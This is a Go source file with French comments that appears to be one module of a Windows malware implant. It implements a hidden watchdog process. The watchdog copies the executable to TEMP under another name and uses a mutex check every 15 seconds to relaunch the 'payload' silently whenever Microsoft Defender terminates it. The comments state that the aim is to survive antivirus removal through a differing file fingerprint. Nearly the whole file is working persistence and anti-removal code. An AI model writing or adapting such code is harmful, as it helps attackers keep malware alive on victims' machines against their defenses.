// watchdog.go — surveillance du processus principal.
//
// Defender termine parfois le payload après avoir reconnu le binaire. La
// persistance seule ne suffit alors pas : elle ne repart qu'au prochain
// logon. Le watchdog est une copie lancée avec `-watch` : toutes les 15
// secondes, il vérifie que le mutex du payload existe et, sinon, relance
// l'exécutable en `-silent`.
package main

import (
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"
)

// payloadAlive dit si un processus porte le mutex d'instance.
func payloadAlive() bool {
	name, err := syscall.UTF16PtrFromString(instanceMutexName)
	if err != nil {
		return false
	}
	h, _, callErr := kernel32DLL.NewProc("CreateMutexW").Call(
		0, 0, uintptr(unsafe.Pointer(name)))
	if h == 0 {
		return false
	}
	already := false
	if errno, ok := callErr.(syscall.Errno); ok && errno == syscall.Errno(183) {
		already = true
	}
	syscall.CloseHandle(syscall.Handle(h))
	return already
}

// spawnWatchdog lance une copie de l'exécutable en mode surveillance.
//
// Le surveillant est une copie à part, sous un autre nom : quand Defender
// supprime l'image du payload, celle du watchdog ne porte pas la même
// empreinte et survit assez longtemps pour relancer le processus.
func spawnWatchdog() {
	src := currentExe()
	if src == "" {
		return
	}
	dst := filepath.Join(os.Getenv("TEMP"), "~"+workDirName+".exe")
	if data, err := os.ReadFile(src); err == nil {
		if err := os.WriteFile(dst, data, 0755); err != nil {
			dst = src
		}
	} else {
		dst = src
	}
	if dst == "" {
		return
	}
	c := exec.Command(dst, "-watch")
	c.SysProcAttr = hiddenAttr()
	_ = c.Start()
	plog("watchdog lancé : " + dst)
}

// watchMutex empêche plusieurs watchdogs : sans lui, chaque copie lancée
// ajouterait un surveillant.
var watchMutexName = instanceMutexName + "-w"

// watchLoop est le corps du mode `-watch`.
func watchLoop() {
	// Un seul watchdog par poste.
	if name, err := syscall.UTF16PtrFromString(watchMutexName); err == nil {
		h, _, callErr := kernel32DLL.NewProc("CreateMutexW").Call(0, 0, uintptr(unsafe.Pointer(name)))
		if h != 0 {
			if errno, ok := callErr.(syscall.Errno); ok && errno == syscall.Errno(183) {
				syscall.CloseHandle(syscall.Handle(h))
				return
			}
		}
	}
	for {
		if !payloadAlive() {
			exe := currentExe()
			if exe != "" {
				c := exec.Command(exe, "-silent")
				c.SysProcAttr = hiddenAttr()
				_ = c.Start()
			}
		}
		// Le watchdog se réinstalle aussi lui-même si sa copie a disparu.
		time.Sleep(15 * time.Second)
		if _, err := os.Stat(currentExe()); err != nil {
			return
		}
	}
}
